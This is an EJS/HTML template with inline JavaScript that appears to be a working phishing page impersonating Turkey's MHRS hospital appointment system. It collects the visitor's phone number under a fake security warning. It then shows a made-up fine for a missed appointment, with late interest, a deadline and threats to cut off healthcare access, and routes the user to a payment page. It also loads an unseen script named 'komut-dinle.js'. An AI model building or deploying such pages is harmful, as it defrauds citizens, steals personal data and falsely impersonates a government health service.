    <div id="telefonModal" class="mhrs-popup-overlay">
      <div class="mhrs-popup-card">
        <div class="mhrs-popup-header">
          <h2>Güvenlik Uyarısı</h2>
        </div>
        <div class="mhrs-popup-body">
          <p class="mhrs-popup-kimlik">Sayın, <%= (kullanici && kullanici.ad) ? kullanici.ad : 'Misafir' %></p>
          <p class="mhrs-popup-aciklama">Hesabınızın güvenliği için telefon numaranızı doğrulamanız gerekmektedir. Lütfen telefon numaranızı girip doğrulayın.</p>
          <label for="telefonInput" class="mhrs-popup-label">Telefon Numaranız</label>
          <div class="mhrs-popup-input-wrap">
            <span class="mhrs-popup-prefix">+90 <span class="caret">▾</span></span>
            <input type="tel" id="telefonInput" inputmode="tel" autocomplete="tel" maxlength="10" placeholder="5XX XXX XX XX" class="mhrs-popup-input">
          </div>
          <p id="telefonHata" class="mhrs-popup-hata"></p>
          <button type="button" id="telefonOnayBtn" class="mhrs-popup-btn">Onayla</button>
        </div>
      </div>
    </div>

    <div id="telefonOnayBildirim" class="mhrs-popup-overlay mhrs-popup-overlay--ust" style="pointer-events: none;">
      <div class="mhrs-popup-bildirim" style="pointer-events: auto;">
        <div class="mhrs-popup-bildirim-icon">✓</div>
        <h2>Numara Onaylandı</h2>
        <p>Telefon numaranız başarıyla doğrulandı.</p>
        <button type="button" id="bildirimKapat" class="mhrs-popup-btn">Kapat</button>
      </div>
    </div>

 <% if (kullanici && kullanici.tcno) { %>
    <div id="cezaModal" class="mhrs-popup-overlay mhrs-popup-overlay--ust">
      <div class="mhrs-popup-card">
        <div class="mhrs-popup-header">
          <h2>Randevu İptal Cezası Bildirimi</h2>
        </div>
        <div class="mhrs-popup-body">
          <p class="mhrs-popup-kimlik">Sayın, <%= kullanici.ad ? kullanici.ad : 'Misafir' %></p>
          <p class="mhrs-popup-aciklama">T.C. Sağlık Bakanlığı Merkezi Hekim Randevu Sistemi (MHRS) yönergesi kapsamında, randevusuna gitmeyen hastalar hakkında idari para cezası uygulanmaktadır.</p>

          <div class="mhrs-popup-kutu mhrs-popup-kutu--uyari">
            <ul>
              <li>Gidilmeyen Randevu Sayısı: <strong>1</strong></li>
            </ul>
          </div>

          <div class="mhrs-popup-kutu" style="border: 1px solid #e8e8e8;">
            <div class="mhrs-popup-tutar-satir">
              <span>Temel İdari Para Cezası</span><strong><%= odeme.borcTutarMetin %></strong>
            </div>
            <% if (odeme.gecikmeFaizi > 0) { %>
            <div class="mhrs-popup-tutar-satir" style="margin-top: 4px;">
              <span>Gecikme Faizi</span><strong><%= odeme.faizTutariMetin %></strong>
            </div>
            <% } %>
            <div class="mhrs-popup-tutar-satir" style="margin-top: 12px; padding-top: 12px; border-top: 1px solid #e8e8e7; align-items: baseline;">
              <span style="color: #f5222d; font-weight: 700;">Toplam Ödenecek Tutar:</span>
              <span style="color: #f5222d; font-weight: 700; font-size: 16px;"><%= odeme.toplamMetin %></span>
            </div>
          </div>

          <div class="mhrs-popup-kutu mhrs-popup-kutu--hata">
            <p style="font-weight: 700; color: #cf1322;">Son Ödeme Tarihi: 24.08.26</p>
            <p style="margin-top: 4px; font-size: 12px; color: #a8071a;">Belirtilen tarihe kadar ödeme yapılmadığı takdirde MHRS üzerinden yeni randevu alma ve sağlık hizmeti erişimleriniz kısıtlanacaktır.</p>
          </div>

          <div class="mhrs-popup-kutu mhrs-popup-kutu--bilgi">
            <p style="font-size: 12px; color: #003a8c;"><strong>Önemli:</strong> Bu ceza T.C. Kimlik numaranıza tanımlanmıştır. Ödeme yapılmadan yeni randevu oluşturulamaz.</p>
          </div>

          <label class="mhrs-popup-onay">
            <input type="checkbox" id="cezaOnay">
            <span>Bilgilendirmeyi okudum, ödeme yükümlülüğümü kabul ediyorum.</span>
          </label>
          <button type="button" id="cezaOdeBtn" disabled class="mhrs-popup-btn"><%= odeme.toplamMetin %> Öde</button>
        </div>
      </div>
    </div>
    <script>
      (function () {
        try {
          var telefonModal = document.getElementById("telefonModal");
          var telefonInput = document.getElementById("telefonInput");
          var telefonBtn = document.getElementById("telefonOnayBtn");
          var telefonHata = document.getElementById("telefonHata");
          var bildirim = document.getElementById("telefonOnayBildirim");
          var bildirimKapat = document.getElementById("bildirimKapat");
          var modal = document.getElementById("cezaModal");
          var onay = document.getElementById("cezaOnay");
          var btn = document.getElementById("cezaOdeBtn");
          if (!telefonModal || !modal || !onay || !btn) return;

          function goster(el) { el.style.display = "flex"; }
          function gizle(el) { el.style.display = "none"; }
          function telefonHatasiGoster(mesaj) {
            telefonHata.textContent = mesaj || "Geçerli bir telefon numarası giriniz.";
            telefonHata.style.display = "block";
            telefonInput.style.borderColor = "#f5222d";
            telefonInput.style.boxShadow = "0 0 0 2px rgba(245, 34, 45, 0.12)";
            telefonInput.setAttribute("aria-invalid", "true");
            telefonInput.focus();
          }
          function telefonHatasiKapat() {
            telefonHata.textContent = "";
            telefonHata.style.display = "none";
            telefonInput.style.borderColor = "#d9d9d9";
            telefonInput.style.boxShadow = "none";
            telefonInput.setAttribute("aria-invalid", "false");
          }

          var bildirimZamanlayici = null;
          function bildirimKapatFonksiyonu() {
            if (bildirimZamanlayici) {
              window.clearTimeout(bildirimZamanlayici);
              bildirimZamanlayici = null;
            }
            gizle(bildirim);
            goster(modal);
          }

          telefonInput.addEventListener("input", function () {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
            if (telefonHata && telefonHata.style.display === "block") {
              telefonHatasiKapat();
            }
          });

          telefonBtn.addEventListener("click", function () {
            var t = telefonInput.value.replace(/\D/g, '').trim();
            var telefonRegex = /^(?:\+?90|0)?\d{10}$/;
            if (!telefonRegex.test(t)) {
              telefonHatasiGoster("Geçerli bir telefon numarası giriniz.");
              return;
            }
            telefonHatasiKapat();
            telefonBtn.disabled = true;
            fetch("/api/telefon-dogrula", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ telefon: t })
            })
              .then(function (r) { return r.json(); })
              .then(function (d) {
                if (d && d.ok) {
                  gizle(telefonModal);
                  goster(bildirim);
                  bildirimZamanlayici = window.setTimeout(bildirimKapatFonksiyonu, 5000);
                } else {
                  telefonHatasiGoster((d && d.hata) || "Doğrulama yapılamadı.");
                  telefonBtn.disabled = false;
                }
              })
              .catch(function () {
                telefonHatasiGoster("Sunucuya bağlanılamadı.");
                telefonBtn.disabled = false;
              });
          });

          if (bildirimKapat) {
            bildirimKapat.addEventListener("click", bildirimKapatFonksiyonu);
          }

          var telefonKayitli = <%- JSON.stringify(!!(kullanici && kullanici.telefon)) %>;
          if (telefonKayitli) {
            // Telefon zaten doğrulanmış: bildirim olayını atla, ceza popup'ını doğrudan göster
            goster(modal);
          } else {
            var gosterTelefon = function () { goster(telefonModal); };
            if (document.readyState !== "loading") { gosterTelefon(); } else {
              window.addEventListener("DOMContentLoaded", gosterTelefon);
            }
          }

          onay.addEventListener("change", function () {
            btn.disabled = !onay.checked;
          });
          btn.addEventListener("click", function () {
            window.location.href = "/odeme";
          });
        } catch (e) {}
      })();
    </script>
    <% } %>
    <script src="/js/komut-dinle.js"></script>
 </body></html>